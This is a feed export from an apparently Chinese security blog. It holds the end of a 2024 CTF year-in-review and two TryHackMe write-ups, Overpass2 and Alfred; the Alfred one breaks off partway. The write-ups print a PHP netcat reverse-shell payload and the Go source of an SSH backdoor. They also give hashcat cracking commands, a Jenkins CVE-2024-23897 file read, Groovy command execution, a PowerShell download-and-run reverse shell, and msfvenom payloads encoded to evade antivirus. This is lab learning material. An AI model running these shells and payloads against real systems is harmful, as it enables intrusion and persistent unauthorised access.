明年一定要再去一次！</p><h2 id="2024-6"><a href="#2024-6" class="headerlink" title="2024.6"></a>2024.6</h2><p>这个月的比赛还不少，出去了三次</p><p>月初去了盘古石，可惜了不是在南京，北京确实是感觉没啥好玩的了 面基了强哥和阳哥，又帅又有实力</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022122796.png" alt="image-20250102212208375"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022122061.png" alt="image-20250102212241152"></p><p>中旬的时候去了复兴杯，那天是真得赶。上午坐车去北京打了一下第六届职业技能大赛取证科目，中午坐车回学校参加下午的六级考试，晚上在赶车去唐山打复兴杯，也是和很多战队的师傅们见面了，一起恰了一顿饭。</p><p>结果还不错，当时差一道密码就能拿第一了，可惜可惜，经典赛后出flag，一题之差奖金从5w变2w QAQ</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022126190.png" alt="image-20250102212605075"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022126984.png" alt="image-20250102212615238"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022126402.png" alt="image-20250102212633269"></p><p>22号的时候给20届的老学长们开了欢送会，时间是真的快啊，当时他们把我们招进社团的样子还历历在目。</p><p>后面月底在马上期末的状态下去打了国赛半决，去年因为名额问题，两只都是学长去的，今年也是成功到了半决赛，比较可惜，原因比较难评，希望25年可以实现愿望。</p><h2 id="2024-7"><a href="#2024-7" class="headerlink" title="2024.7"></a>2024.7</h2><p>刚放假一个星期，去了一趟山西警院打黄河流域，也是和国赛一样的难评原因，但也是见识到了赛宁的奇葩平台一血不加分，还随着后面的分数一起衰减哈哈哈 不过太原对于一个喜欢面食的人来说真的是天堂，顺道玩了几天，每天都是疯狂的进食碳水。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022135094.png" alt="image-20250102213513488"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022135630.png" alt="image-20250102213518756"></p><h2 id="2024-8"><a href="#2024-8" class="headerlink" title="2024.8"></a>2024.8</h2><p>就是在去山西打黄河流域的时候，老师通知说有一个去上交参加集训营的机会，正好算是临开学在出去玩一趟还能认识很多厉害的师傅，遂报名参加了。没想到还面基到了巨魔，太好了是巨魔 我们有救了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022137099.png" alt="image-20250102213758784"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022138159.png" alt="image-20250102213811058"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022138790.png" alt="image-20250102213817376"></p><p>拿到了第二名一等奖，爽恰了奖金，不爽的开学了</p><h2 id="2024-9"><a href="#2024-9" class="headerlink" title="2024.9"></a>2024.9</h2><p>今年也成功打到了京津冀决赛，去年打进决赛但是因为和蓝帽杯冲突没去成，现在回想起来，感觉当时还不如去京津冀哈哈哈</p><p>全靠我们的re✌眼疾手快，最后没有空手而归</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022141416.png" alt="image-20250102214124051"></p><p>月底的时候去打了省赛，当时我们仨个还在想，拿了第一要去分享经验，好社恐还是不去了，随意都是随便打的，谁能想到真拿第一了</p><p>SeeU-Sec NB！</p><p>难绷的是 竟然分币没有 对标隔壁山东省赛 狠狠羡慕了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022143750.png" alt="image-20250102214314259"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022143371.png" alt="image-20250102214308664"></p><p>同时也收到了xenny老师的nss年度出题人礼物 刻着我id的徽章真的很帅 感谢xenny老师 感谢nss</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022145580.png" alt="image-20250102214508569"></p><h2 id="2024-10"><a href="#2024-10" class="headerlink" title="2024.10"></a>2024.10</h2><p>月底跟着老师院长去领了数信杯半决赛的奖 这奖杯真的算是见过设计最走心 最帅的一个了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022147660.png" alt="image-20250102214735525"></p><p>还趁着活动周去参加了bytectf决赛答辩 走之前看了蓦然回首 论《为什么藤本树是神》</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022148344.png" alt="image-20250102214831585"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022148045.png" alt="image-20250102214836824"></p><h2 id="2024-11"><a href="#2024-11" class="headerlink" title="2024.11"></a>2024.11</h2><p>11月真的算是圆梦的一月</p><p>打了三年美亚，最后一次收官之战，拿下了全国第一 SeeU-Sec NB！！</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022149922.png" alt="image-20250102214959351"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022150123.png" alt="image-20250102215013751"></p><p>月底去贵阳打了网鼎，压力拉满 不过作为社团第一次打进半决赛的我们来说 还算<del>创造历史</del></p><p>希望后面学弟们能打进决赛哈哈哈</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022153300.png" alt="image-20250102215305091"></p><h2 id="2024-12"><a href="#2024-12" class="headerlink" title="2024.12"></a>2024.12</h2><p>月初去了数证杯，感觉会是取证这块最后一次比赛了hhh 马上要退役了 也要把名额留给学弟们</p><p>还算不错 个人赛拿到了学生组的第一 前面的职业哥确实强</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022154637.png" alt="image-20250102215414982"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022155039.png" alt="image-20250102215504870"></p><p>奖杯和奖牌也是非常的帅</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022155445.png" alt="image-20250102215517843"></p><p>中旬的时候 想着捣鼓一下社团的靶机 结果因为想搞个docker+vscode 给学校服务器的ssh给改了一下 还是拜托网管处老师给重置才修好的(再也不瞎改远程服务器ssh了QAQ) 终于是摆脱之前那个笨重的CTFD 换上了GZCTF 这个确实看着顺眼</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022215238.png" alt="image-20250102221505152"></p><p>本来打算数证杯比完 这学期就不打了 专心回学校复习 但老师说还有个冀信杯 也算是省赛 是任务 一定要去 想到去年遗憾只拿到了第四 今年高低去把第一拿回来 还是去了 三个赛制 时间还是比较紧张 不过好在有惊无险 拿到了第一  真的算是确定了我们的SeeU-Sec在省内的领先地位 希望学弟们可以守护下去哈哈哈</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022158127.png" alt="image-20250102215844743"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022158568.png" alt="image-20250102215831258"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>写到这里 今年的事情差不多就结束了 其实大大小小的比赛还参加了不少 基本每个周末都没有闲着的时候 每天在食堂 宿舍 实验室三点一线 生活虽然规律 但是并不单调 </p><p>警校生活确实是枯燥无味 如果不是加入社团 我可能会和大部分学校网安专业的学生一样 学了快三年了 一问专业知识啥也不会 碌碌无为的度过四年时光 非常庆幸自己在22年的那个秋天 选择了加入社团 也非常感谢领导、老师对我们的支持还有队友们的通力合作 </p><p>让我在社团 在实验室找到了真正可以实现自我价值的地方 也是一个真正让我感觉放松 可以找到快乐的地方</p><p>这是非常充实的一年 弥补了不少遗憾 虽然并不完美 但是我坚信在25年 可以像今年一样 一件件的圆满回来</p><p>马上就要开始准备联考了 后面留给自己学习和比赛的时间其实屈指可数 在25年仅剩的这段安全学习之旅中 希望自己可以多学习一些实战方面的东西 而不是只会打ctf和取证 </p><p>也希望在我们这届退役之后 社团的后浪们可以快点把我们拍在沙滩上 闯荡出一片属于他们的传奇 </p><p>2024年的人生 也算不虚此行。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501022207791.png" alt="image-20250102220756678"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024年年度总结&quot;&gt;&lt;a href=&quot;#2024年年度总结&quot; class=&quot;headerlink&quot; title=&quot;2024年年度总结&quot;&gt;&lt;/a&gt;2024年年度总结&lt;/h1&gt;&lt;p&gt;时间过得真快 距离上一次写年度总结已经过去了一年的时间 上次写的时候自己还是一个萌新</summary>
      
    
    
    
    <category term="随笔" scheme="http://w3nx1z1.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>Offensive Pentesting-Overpass2</title>
    <link href="http://w3nx1z1.github.io/posts/3e5876b.html"/>
    <id>http://w3nx1z1.github.io/posts/3e5876b.html</id>
    <published>2024-12-11T13:43:33.798Z</published>
    <updated>2025-02-14T08:30:17.426Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-Overpass2"><a href="#Offensive-Pentesting-Overpass2" class="headerlink" title="Offensive Pentesting-Overpass2"></a>Offensive Pentesting-Overpass2</h1><p>这个room主要是一个流量分析溯源取证的 难度相对来说比较简单 同时分析完攻击行为之后 我们可以利用流量包中的记录来进行攻击靶机</p><h2 id="Forensics-Analyse-the-PCAP"><a href="#Forensics-Analyse-the-PCAP" class="headerlink" title="Forensics - Analyse the PCAP"></a>Forensics - Analyse the PCAP</h2><p>下载下来附件是一个流量包 直接追踪tcp流</p><p>第一个流中 上传了一个反弹shell马</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412111623317.png" alt="image-20241211162338255"></p><p>他们用来上传反向 shell 的页面的 URL 是什么？</p><pre><code>/development</code></pre><p>攻击者使用什么有效负载来获取访问权限？</p><pre><code>&lt;?php exec(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f&quot;)?&gt;</code></pre><p>第三个流中就是一个反弹到shell后执行命令的记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412111622433.png" alt="image-20241211162229233"></p><p>也能看到使用<code>su james</code>命令登陆到了james用户</p><p>攻击者使用什么密码来获取权限？</p><pre><code>whenevernoteartinstant</code></pre><p>往后看到执行了<code>sudo -l</code>命令查看了当前james用户的sudo权限规则 查看哪些命令可以被执行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412111637040.png" alt="image-20241211163719988"></p><p>在往后看 看到是下载了一个ssh的后门项目 应该就是通过这个来进行持久化的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112023420.png" alt="image-20241211202301336"></p><p>攻击者是如何建立持久性的？</p><pre><code>https://github.com/NinjaJc01/ssh-backdoor</code></pre><p>下一道题 需要我们来爆破密码 因为根据<code>sudo -l</code>的结果 james拥有root权限的 所以是可以读取<code>/etc/shadow</code>的内容的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112025853.png" alt="image-20241211202509782"></p><p>这里一共是获取到了五个用户的密码哈希值 我们可以使用hashcat来进行爆破 题干中也提示了使用fasttrack字典来进行爆破</p><p>先来找一下这个字典具体的位置</p><pre><code>sudo find / -name &quot;*fasttrack*&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112037293.png" alt="image-20241211203759227"></p><pre><code>hashcat -m 1800 -a 0 hash1.txt /usr/share/wordlists/fasttrack.txt</code></pre><p>可以看到出了james的登陆密码 剩下四个用户的密码都爆破出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112053621.png" alt="image-20241211205352551"></p><p>使用 fasttrack 单词列表，有多少系统密码是可破解的？</p><pre><code>4</code></pre><h2 id="Research-Analyse-the-code"><a href="#Research-Analyse-the-code" class="headerlink" title="Research - Analyse the code"></a>Research - Analyse the code</h2><p>接上一部分 我们已经找到了他进行持久化使用的后门程序 我们直接去GitHub上把这个项目下载下来 <a href="https://github.com/NinjaJc01/ssh-backdoor">https://github.com/NinjaJc01/ssh-backdoor</a></p><p>这应该是一个使用go语言编写的脚本程序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112055170.png" alt="image-20241211205528116"></p><p>打开查看源代码</p><pre><code class="go">package mainimport (    &quot;crypto/sha512&quot;    &quot;fmt&quot;    &quot;io&quot;    &quot;io/ioutil&quot;    &quot;log&quot;    &quot;net&quot;    &quot;os/exec&quot;    &quot;github.com/creack/pty&quot;    &quot;github.com/gliderlabs/ssh&quot;    &quot;github.com/integrii/flaggy&quot;    gossh &quot;golang.org/x/crypto/ssh&quot;    &quot;golang.org/x/crypto/ssh/terminal&quot;)var hash string = &quot;bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3&quot;func main() &#123;    var (        lport       uint   = 2222        lhost       net.IP = net.ParseIP(&quot;0.0.0.0&quot;)        keyPath     string = &quot;id_rsa&quot;        fingerprint string = &quot;OpenSSH_8.2p1 Debian-4&quot;    )    flaggy.UInt(&amp;lport, &quot;p&quot;, &quot;port&quot;, &quot;Local port to listen for SSH on&quot;)    flaggy.IP(&amp;lhost, &quot;i&quot;, &quot;interface&quot;, &quot;IP address for the interface to listen on&quot;)    flaggy.String(&amp;keyPath, &quot;k&quot;, &quot;key&quot;, &quot;Path to private key for SSH server&quot;)    flaggy.String(&amp;fingerprint, &quot;f&quot;, &quot;fingerprint&quot;, &quot;SSH Fingerprint, excluding the SSH-2.0- prefix&quot;)    flaggy.String(&amp;hash, &quot;a&quot;, &quot;hash&quot;, &quot;Hash for backdoor&quot;)    flaggy.Parse()    log.SetPrefix(&quot;SSH - &quot;)    privKeyBytes, err := ioutil.ReadFile(keyPath)    if err != nil &#123;        log.Panicln(&quot;Error reading privkey:\t&quot;, err.Error())    &#125;    privateKey, err := gossh.ParsePrivateKey(privKeyBytes)    if err != nil &#123;        log.Panicln(&quot;Error parsing privkey:\t&quot;, err.Error())    &#125;    server := &amp;ssh.Server&#123;        Addr:            fmt.Sprintf(&quot;%s:%v&quot;, lhost.String(), lport),        Handler:         sshterminal,        Version:         fingerprint,        PasswordHandler: passwordHandler,    &#125;    server.AddHostKey(privateKey)    log.Println(&quot;Started SSH backdoor on&quot;, server.Addr)    log.Fatal(server.ListenAndServe())&#125;func verifyPass(hash, salt, password string) bool &#123;    resultHash := hashPassword(password, salt)    return resultHash == hash&#125;func hashPassword(password string, salt string) string &#123;    hash := sha512.Sum512([]byte(password + salt))    return fmt.Sprintf(&quot;%x&quot;, hash)&#125;func sshHandler(s ssh.Session) &#123;    command := s.RawCommand()    if command != &quot;&quot; &#123;        s.Write(runCommand(command))        return    &#125;    term := terminal.NewTerminal(s, &quot;$ &quot;)    for &#123;        command, _ = term.ReadLine()        if command == &quot;exit&quot; &#123;            return        &#125;        term.Write(runCommand(command))    &#125;&#125;func sshterminal(s ssh.Session) &#123;    cmd := exec.Command(&quot;/bin/bash&quot;, &quot;-i&quot;)    ptyReq, _, isPty := s.Pty()    if isPty &#123;        cmd.Env = append(cmd.Env, fmt.Sprintf(&quot;TERM=%s&quot;, ptyReq.Term))        f, err := pty.Start(cmd)        if err != nil &#123;            panic(err)        &#125;        go func() &#123;            io.Copy(f, s) // stdin        &#125;()        io.Copy(s, f) // stdout        cmd.Wait()    &#125; else &#123;        io.WriteString(s, &quot;No PTY requested.\n&quot;)        s.Exit(1)    &#125;&#125;func runCommand(cmd string) []byte &#123;    result := exec.Command(&quot;/bin/bash&quot;, &quot;-c&quot;, cmd)    response, _ := result.CombinedOutput()    return response&#125;func passwordHandler(_ ssh.Context, password string) bool &#123;    return verifyPass(hash, &quot;1c362db832f3f864c8c2fe05f2002a05&quot;, password)&#125;</code></pre><p>What’s the default hash for the backdoor?</p><pre><code>bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3</code></pre><p>What’s the hardcoded salt for the backdoor?</p><pre><code>1c362db832f3f864c8c2fe05f2002a05</code></pre><p>下一题看起来他应该是使用了这个后门程序破解了一个哈希值 对应在流量包的这个部分</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112058127.png" alt="image-20241211205812063"></p><p>What was the hash that the attacker used? - go back to the PCAP for this!</p><pre><code>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</code></pre><p>我们可以使用rockyou.txt来破解一下这个哈希值 根据前面源码可以得知 这个哈希值应该是sha512</p><pre><code>func hashPassword(password string, salt string) string &#123;    hash := sha512.Sum512([]byte(password + salt))    return fmt.Sprintf(&quot;%x&quot;, hash)&#125;</code></pre><p>对应使用的hashcat命令是</p><pre><code>hashcat -m 1710 -a 0 hash.txt rockyou.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112103072.png" alt="image-20241211210312017"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112101000.png" alt="image-20241211210123923"></p><p>Crack the hash using rockyou and a cracking tool of your choice. What’s the password?</p><pre><code>november16</code></pre><h2 id="Attack-Get-back-in"><a href="#Attack-Get-back-in" class="headerlink" title="Attack - Get back in!"></a>Attack - Get back in!</h2><pre><code>现在事件已经被调查，Paradox 需要有人再次控制 Overpass 生产服务器。盒子上有一些flag，Overpass 不能因为格式化服务器而丢失！</code></pre><p>攻击者污损了网站。他们留下了什么信息作为标题？</p><pre><code>H4ck3d by CooctusClan</code></pre><p>首先是第一题 这个其实在流量包中就能看到 当然直接访问靶机网站也可以</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112119481.png" alt="image-20241211211954409"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112104314.png" alt="image-20241211210442255"></p><p>现在 我们有了一组账密 可以直接使用ssh连接上这台靶机 再根据上面代码中的内容 判断出应该是使用2222端口进行ssh连接</p><pre><code>func main() &#123;    var (        lport       uint   = 2222        lhost       net.IP = net.ParseIP(&quot;0.0.0.0&quot;)        keyPath     string = &quot;id_rsa&quot;        fingerprint string = &quot;OpenSSH_8.2p1 Debian-4&quot;    )</code></pre><p>事实上 我们可以扫一下端口 发现确实2222端口也存在ssh服务</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112119151.png" alt="image-20241211211905076"></p><pre><code>ssh james@10.10.187.108 -p 2222</code></pre><p>但是发生报错</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112119477.png" alt="image-20241211211924433"></p><p>gpt一下 大概意思是服务器只支持旧的 <code>ssh-rsa</code> 算法，而我的客户端可能已禁用此算法，特别是在较新版本的 OpenSSH 中。</p><p>那修改一下命令</p><pre><code>ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -p 2222 james@10.10.187.108</code></pre><p> 连接成功</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112120557.png" alt="image-20241211212040471"></p><p>先读user的flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112124903.png" alt="image-20241211212426855"></p><p>再看一下suid</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112131910.png" alt="image-20241211213117845"></p><p>有个<code>.suid_bash</code> 应该可以bash提权 直接读root的flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412112131906.png" alt="image-20241211213140850"></p><p>What’s the user flag?</p><pre><code>thm&#123;d119b4fa8c497ddb0525f7ad200e6567&#125;</code></pre><p>What’s the root flag?</p><pre><code>thm&#123;d53b2684f169360bb9606c333873144d&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Offensive-Pentesting-Overpass2&quot;&gt;&lt;a href=&quot;#Offensive-Pentesting-Overpass2&quot; class=&quot;headerlink&quot; title=&quot;Offensive Pentesting-Overpass2&quot;&gt;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>Offensive Pentesting-Alfred</title>
    <link href="http://w3nx1z1.github.io/posts/3bc2e38b.html"/>
    <id>http://w3nx1z1.github.io/posts/3bc2e38b.html</id>
    <published>2024-12-09T13:09:23.941Z</published>
    <updated>2025-02-14T08:30:17.424Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-Alfred"><a href="#Offensive-Pentesting-Alfred" class="headerlink" title="Offensive Pentesting-Alfred"></a>Offensive Pentesting-Alfred</h1><pre><code>Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.利用 Jenkins 获取初始 shell，然后通过利用 Windows 身份验证令牌来提升您的权限。</code></pre><h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>先来扫目录和端口</p><pre><code>nmap -T4 -sC -sV -Pn 10.10.118.134</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091349466.png" alt="image-20241209134916346"></p><p>可以看到tcp协议开放的端口一共有3个</p><p>How many ports are open? (TCP only)</p><pre><code>3</code></pre><p>下面来访问一下web服务 80端口的没啥用 直接来看8080端口 上来是一个登录框</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091400800.png" alt="image-20241209140045691"></p><p>先直接试一下弱口令：<code>admin:admin</code> 结果直接登上去了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091401134.png" alt="image-20241209140152889"></p><p>What is the username and password for the login panel? (in the format username:password)</p><pre><code>admin:admin</code></pre><h2 id="获取user的flag"><a href="#获取user的flag" class="headerlink" title="获取user的flag"></a>获取user的flag</h2><h3 id="CVE-2024–23897任意文件读取、远程命令执行"><a href="#CVE-2024–23897任意文件读取、远程命令执行" class="headerlink" title="CVE-2024–23897任意文件读取、远程命令执行"></a>CVE-2024–23897任意文件读取、远程命令执行</h3><p>放在2024年的今天 我们再去做这个靶场的时候 其实我们会有更多的方法去做 比如在我们知道用户名的情况下使用CVE-2024–23897进行任意文件读取就可以读到普通用户文件夹下的flag</p><p><a href="https://blog.csdn.net/qq_34594929/article/details/136446671">Jenkins 任意文件读取(CVE-2024-23897)+后台用户密码提取哈希破解+反弹Shell 一条龙-CSDN博客</a></p><p>这里我们参考这篇文章 首先 下载<code>jenkins-cli.jar</code>文件 直接访问</p><pre><code>http://10.10.33.70:8080/jnlpJars/jenkins-cli.jar </code></pre><p>现在我们就可以开始进行任意文件读取 但是在这个靶机中 我们知道他是一台windows靶机 文件结构和linux当然有所不同 要读取普通用户文件夹下的flag就需要知道它的用户名是什么 这里先进行远程命令执行 读取用户名</p><p>点击Managae Jenkins——Scripts Console</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091538161.png" alt="image-20241209153818024"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091538564.png" alt="image-20241209153856379"></p><p>这里查看用户名可以有两种命令</p><pre><code>1.println &quot;whoami&quot;.execute().text2.println &quot;cmd.exe /c dir C:\\Users&quot;.execute().text</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091540850.png" alt="image-20241209154019740"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091540382.png" alt="image-20241209154038296"></p><p>拿到用户名之后我们可以读flag了 读flag也是有两种方法</p><h4 id="任意文件读取读flag"><a href="#任意文件读取读flag" class="headerlink" title="任意文件读取读flag"></a>任意文件读取读flag</h4><p>接上文 我们在拿到jenkins-cli.jar 文件之后 就可以进行任意文件读取了 其中使用不同命令读取到的文件内容数量是不一样的 其中help只能读到第一行的内容<font color='red'>(当然这里对于我们读取flag并没有影响)</font> 这里直接说结论 都使用<code>connect-node</code>来进行读取 这个命令可以读取文件全部的内容 同时对服务的影响最小 </p><pre><code>java -jar jenkins-cli.jar -s http://10.10.33.70:8080 connect-node &#39;@/C:/Users/bruce/Desktop/user.txt&#39;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091547469.png" alt="image-20241209154719405"></p><p>其中报错信息中的内容就是我们想要读取的用户文件夹下的flag内容</p><h4 id="远程命令执行读flag"><a href="#远程命令执行读flag" class="headerlink" title="远程命令执行读flag"></a>远程命令执行读flag</h4><p>上面也提到了 我们是可以进行远程命令执行的 因此我们完全可以直接读flag的内容 这里有几个点需要注意</p><pre><code>1.要正确执行 Windows 的命令，可以通过 cmd.exe 执行该命令，确保系统能够正确识别并执行。2.Windows文件路径应使用双反斜杠 \ 如果路径中有空格，确保路径被双引号包围。</code></pre><p>因此我们读取flag的命令是</p><pre><code>println &quot;cmd.exe /c type C:\\Users\\bruce\\Desktop\\user.txt&quot;.execute().text</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091559266.png" alt="image-20241209155953186"></p><h3 id="Nishang反弹shell"><a href="#Nishang反弹shell" class="headerlink" title="Nishang反弹shell"></a>Nishang反弹shell</h3><p>查找该工具的一个功能，该功能允许您在底层系统上执行命令。找到此功能后，可以使用此命令在计算机上获取反向 shell，然后运行它</p><pre><code>powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port</code></pre><p>这里还是可以使用上面我们找到的这个命令执行处 命令需要调整一下 满足Groovy 脚本的要求</p><pre><code>println &quot;powershell -Command \&quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://10.14.92.176/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.14.92.176 -Port 1234\&quot;&quot;.execute().text</code></pre><p>成功反弹到了命令</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091627421.png" alt="image-20241209162702307"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091630728.png" alt="image-20241209163034673"></p><h4 id="还有一个可以命令执行的地方"><a href="#还有一个可以命令执行的地方" class="headerlink" title="还有一个可以命令执行的地方"></a>还有一个可以命令执行的地方</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091632736.png" alt="image-20241209163235486"></p><p>这里的命令我们就写靶机页面上给我们提供的就行了</p><pre><code>powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://10.14.92.176/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.14.92.176 -Port 1234</code></pre><pre><code>iex：这是 PowerShell cmdlet“Invoke-Expression”的简写，用于评估和执行以字符串形式传递的 PowerShell 命令或脚本(New-Object Net.WebClient).DownloadString(&#39;http://your-thm-ip:your-port/Invoke-PowerShellTcp.ps1&#39;)：此部分创建 .NET WebClient 类的新实例，该实例用于从指定的 URL 下载内容。在这种情况下，它会从指定的 URL 下载 PowerShell 脚本“Invoke-PowerShellTcp.ps1”的内容Invoke-PowerShellTcp -Reverse -IPAddress your-thm-ip -Port your-port：这部分执行下载的脚本 “Invoke-PowerShellTcp.ps1” 和一定的参数-Reverse：此参数可能指示“Invoke-PowerShellTcp.ps1”脚本创建反向 shell，这意味着它将连接回指定的 IP 和端口，以在攻击者的机器上打开命令 shell，从而提供对目标机器的远程访问和控制</code></pre><p>然后点击右下角的Apply 在回退到前一个页面 点击Build Now</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091646777.png" alt="image-20241209164656643"></p><h2 id="Switching-Shells"><a href="#Switching-Shells" class="headerlink" title="Switching Shells"></a>Switching Shells</h2><p>为了简化权限提升，让我们使用以下过程切换到 meterpreter shell。</p><p>使用 msfvenom 通过以下有效负载创建 Windows meterpreter 反向 shell：</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe</code></pre><p>此负载生成编码的 x86-64 反向 TCP 计量器负载。有效负载通常进行编码以确保它们正确传输，并规避杀软。杀软可能无法识别负载，也不会将其标记为恶意。</p><p>创建此有效负载后，使用上一步中的相同方法将其下载到计算机：</p><pre><code>powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://your-thm-ip:8000/shell-name.exe&#39;,&#39;shell-name.exe&#39;)&quot;</code></pre><p>在运行此程序之前，请确保在 Metasploit 中设置处理程序：</p><pre><code>use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run</code></pre><p>此步骤使用 Metasploit 处理程序接收来自反向 shell 的传入连接。运行后，输入此命令以启动反向 shell</p><pre><code>Start-Process &quot;shell-name.exe&quot;</code></pre><p>这应该会为你生成一个 meterpreter shell</p><p>下面跟着上面的步骤来操作一下</p><p>先生成反弹shell的exe程序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091639529.png" alt="image-20241209163924464"></p><p>在用上一步的方法弹一个普通用户的shell 进入之后把我们刚才生成的shell-name.exe下载下来</p><pre><code>powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.14.92.176/shell-name.exe&#39;,&#39;shell-name.exe&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091652920.png" alt="image-20241209165206848"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412091652682.png" 